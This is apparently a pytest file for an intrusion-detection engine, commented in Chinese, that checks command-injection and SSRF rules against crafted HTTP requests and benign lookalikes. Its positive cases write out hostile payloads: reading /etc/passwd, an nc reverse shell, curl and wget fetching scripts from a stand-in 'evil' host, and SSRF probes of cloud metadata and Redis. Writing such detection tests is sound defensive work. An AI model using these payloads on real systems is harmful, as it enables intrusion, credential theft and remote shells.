"""命令注入 / SSRF 规则测试（v2.1）。

这一组是「补能力」而不是「修漏检」，所以测试的重点和 v2.0 那批规则不同：
判据要覆盖的是**语法位置**，不是具体命令。所以真阳性侧故意换了十几种命令
（`id` / `whoami` / `cat` / `curl` / `nc` / `ls`）和五种分隔符（`;` `&&` `||`
`|` `$( )` 反引号），只要形状对就该命中；真阴性侧则放**形状像、语义不是**
的东西——广告跟踪宏 `${id}`、排序参数 `sort=name|id`、`;jsessionid=`、
被截断的 `$(id`。

SSRF 的判据是「scheme + 主机」这个组合，所以阴性侧的关键样本是
**只有主机没有 scheme** 的文本（文档、日志、示例），以及落在 RFC 1918
之外的相邻地址（`172.32.x`）。

最后一条测试是**反面断言**：扫描器 UA 指纹规则测过、也有效，但精度 0/80，
故意没上线。这种「决定不做」必须被测试守住，否则半年后有人「顺手补上」，
把一条天天刷屏的规则加回来。
"""
from __future__ import annotations

from datetime import datetime
from pathlib import Path

import pytest

from collectors.pcap import _build_event
from engine.detector import _matches, load_rules_dir

RULES = Path(__file__).parent.parent / "rules"


@pytest.fixture(scope="module")
def rules():
    return load_rules_dir(RULES)


@pytest.fixture(scope="module")
def by_id(rules):
    return {r.id: r for r in rules}


def _req(uri="/x", body="", method="GET", headers=None):
    """走**生产**的 `_build_event`，判据视图与线上同一份代码。"""
    h = {"host": "shop.internal"}
    if body:
        h["content-type"] = "application/x-www-form-urlencoded"
    h.update(headers or {})
    return _build_event(
        datetime(2026, 11, 14, 10, 0, 0),
        "203.0.113.9",
        51234,
        f"{method} {uri} HTTP/1.1".encode("utf-8"),
        h,
        body.encode("utf-8"),
    )


# ---------------------------------------------------------------- 命令注入


@pytest.mark.parametrize("uri,body,method", [
    # ③ 命令分隔符
    ("/ping?host=127.0.0.1;cat /etc/passwd", "", "GET"),
    ("/ping?host=127.0.0.1%3Bcat%20/etc/passwd", "", "GET"),   # 编码后的 ;
    ("/ping?host=1&&id", "", "GET"),                           # 逻辑与
    ("/ping?host=1%26%26id", "", "GET"),
    ("/ping?host=1||uname -a", "", "GET"),                     # 逻辑或
    ("/run?cmd=;ls -la /", "", "GET"),
    # ④ 管道
    ("/ping?host=1|whoami", "", "GET"),
    ("/ping?host=1%7Cwhoami", "", "GET"),
    ("/ping?host=1|nc -e /bin/sh 10.0.0.1 4444", "", "GET"),
    # ① 命令替换 / ② 反引号
    ("/ping?host=$(id)", "", "GET"),
    ("/ping?host=%24%28id%29", "", "GET"),
    ("/ping?host=`whoami`", "", "GET"),
    ("/ping?host=%60whoami%60", "", "GET"),
    # 命令后面带完整 URL 的典型反弹 shell
    ("/fetch?url=x;curl http://evil/s.sh|sh", "", "GET"),
    ("/fetch?url=x;wget http://evil/s -O /tmp/s", "", "GET"),
    # POST form body 里的同样形状
    ("/submit", "cmd=;cat /etc/passwd", "POST"),
    ("/submit", "host=1|id", "POST"),
])
def test_command_injection_is_caught(by_id, uri, body, method):
    ev = _req(uri, body, method)
    assert _matches(ev, by_id["http-command-injection"].match), f"应命中：{uri} {body}"


@pytest.mark.parametrize("uri,body", [
    # 广告跟踪宏：`${...}` 是模板变量，不是 shell 的 ${var}
    ("/t?${id}&${duration}&${description}", ""),
    ("/v?cb=${click_id}", ""),
    # 多字段排序：单管道后面不是命令上下文
    ("/list?sort=name|id&page=2", ""),
    ("/list?sort=name%7Cid&page=2", ""),
    # 会话 ID 用分号拼在 URL 里（Java 容器的传统写法）
    ("/app;jsessionid=ABC123DEF", ""),
    ("/a;jsessionid=1&b=2", ""),
    # `$(` 不闭合：只可能是截断文本，不是命令替换
    ("/calc?f=$(price*2", ""),
    ("/doc?t=use%20%24%28id", ""),
    # 正常单词里带分隔符字符
    ("/search?q=a|b|c", ""),
    ("/search?q=5%3C6", ""),
])
def test_benign_lookalikes_do_not_fire(by_id, uri, body):
    ev = _req(uri, body, "POST" if body else "GET")
    assert not _matches(ev, by_id["http-command-injection"].match), f"不该命中：{uri}"


def test_backtick_needs_a_leading_boundary(by_id):
    """竞价 body 里被压缩的随机字节会成对出现反引号。

    真实语料里 `...f`jw40>=5$j`nc`n=a02...` 报过一次误报，所以反引号
    要求前面是 `=&;|` 空白或括号——`host=`whoami`` 满足，随机数据不满足。
    """
    noisy = "/bid?d=f`jw40>=5$j`nc`n=a02"
    assert not _matches(_req(noisy), by_id["http-command-injection"].match)


# ---------------------------------------------------------------- SSRF


@pytest.mark.parametrize("uri", [
    # ① 云元数据
    "/fetch?url=http://169.254.169.254/latest/meta-data/",
    "/fetch?url=http://100.100.100.200/latest/meta-data/",
    "/fetch?url=http://metadata.google.internal/computeMetadata/v1/",
    "/fetch?url=https://169.254.169.254/latest/meta-data/iam/",
    # ② 环回 / 未指定 / IPv6
    "/fetch?url=http://127.0.0.1:8080/admin",
    "/fetch?url=http://127.1.2.3/",
    "/fetch?url=http://127.1:6379/",                    # inet_aton 短写
    "/fetch?url=http://127.0.1:6379/",
    "/fetch?url=http://[::ffff:127.0.0.1]:8080/",       # IPv4 映射到 IPv6
    "/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "/fetch?url=http://localhost:6379/",
    "/fetch?url=http://0.0.0.0/",
    "/fetch?url=http://[::1]:9200/_search",
    # ③ RFC 1918
    "/fetch?url=http://10.0.0.5/",
    "/fetch?url=http://192.168.10.8/",
    "/fetch?url=http://172.16.0.1/",
    "/fetch?url=http://172.31.255.254/",
    # 换个写法的同一个地址
    "/fetch?url=http://2130706433/",
    "/fetch?url=http://0x7f000001/",
    "/fetch?url=http://017700000001/",
    # 非 http scheme：gopher 打 Redis / 内网协议，file 读本地文件
    "/fetch?url=gopher://127.0.0.1:6379/_INFO",
    "/fetch?url=dict://127.0.0.1:11211/stat",
    "/read?f=file:///etc/passwd",
])
def test_ssrf_to_internal_target_is_caught(by_id, uri):
    assert _matches(_req(uri), by_id["http-ssrf-internal"].match), f"应命中：{uri}"


@pytest.mark.parametrize("uri,body", [
    # 只有主机没有 scheme —— 这是文档/日志/示例，不是「让服务器去请求它」
    ("/doc?note=connect%20to%20127.0.0.1%20on%208080", ""),
    ("/help?t=%E8%AF%B7%E8%AE%BF%E9%97%AE%20localhost%3A3000", ""),
    ("/log?msg=upstream%2010.0.0.5%20timeout", ""),
    ("/api/doc", "The metadata endpoint 169.254.169.254 returns credentials."),
    # 相邻但不在私有网段：172.32 已经出了 RFC 1918 的 172.16–31
    ("/fetch?url=http://172.32.0.1/", ""),
    ("/fetch?url=http://11.0.0.1/", ""),
    # 公网域名里带 IP 样子
    ("/fetch?url=http://10.example.com/", ""),
    ("/fetch?url=http://127.example.com/", ""),
    # scheme 有，但主机是外部的；内网地址只出现在查询参数里
    ("/fetch?url=https://example.com/?next=127.0.0.1", ""),
    ("/go?u=https://cdn.example.com/a?ip=192.168.1.1", ""),
])
def test_benign_urls_do_not_fire(by_id, uri, body):
    ev = _req(uri, body, "POST" if body else "GET")
    assert not _matches(ev, by_id["http-ssrf-internal"].match), f"不该命中：{uri}"


def test_mixed_radix_host_is_a_known_gap(by_id):
    """`0x7f.1` 这类混合进制主机**故意不认**，这是记下来的缺口，不是漏掉。

    边界划在这里的理由：`127.1`（inet_aton 短写）与 `[::ffff:127.0.0.1]`
    （IPv4 映射到 IPv6）都认了，因为它们是**同一个地址换一种写法**，正则
    能表达。混合进制（`0x7f.1` = 127.0.1）要认就得把主机拆成四段、每段
    分别按十/十六/八进制解析——那是写一个 IP 解析器，不是写判据。
    而且这个形状**只在冻结语料里出现过**，为它加判据等于拿尺子当训练集。
    """
    ev = _req("/fetch?url=http://0x7f.1:6379/")
    assert not _matches(ev, by_id["http-ssrf-internal"].match)


# ------------------------------------------------- 决定不做的东西也要守住


def test_scanner_ua_rule_is_deliberately_not_shipped(rules):
    """扫描器 UA 指纹：判据有效，但精度 0/80，所以不默认开。

    这类「量完之后决定不做」必须有正面断言守着。否则过一阵子有人看到
    `COVERAGE` 里 `scanner` 是 `False`，顺手把规则加回来——然后在真实
    流量上天天报内网 Nmap，再被安全团队第一条关掉。
    """
    ids = {r.id for r in rules}
    assert "http-scanner-ua" not in ids, "扫描器 UA 规则不该上线（BENCHMARK §2.11）"
    assert not [r for r in rules if "scanner" in r.tags or "扫描器" in (r.name or "")]


def test_coverage_keeps_scanner_out_with_a_reason():
    """分母口径也要能被测试读到，且理由里要留着实测数字。"""
    import sys
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
    from bench import run_crosscheck as cc

    for cat in ("sqli", "xss", "path-traversal", "deserialization", "rce", "ssrf"):
        supported, basis = cc.COVERAGE[cat]
        assert supported is True, f"{cat} 在 v2.1 应当已进分母"
        assert basis, f"{cat} 缺依据说明"

    supported, basis = cc.COVERAGE["scanner"]
    assert supported is False
    assert "0/80" in basis, "扫描器留在分母外的理由必须带着实测精度，否则读者以为是没做"
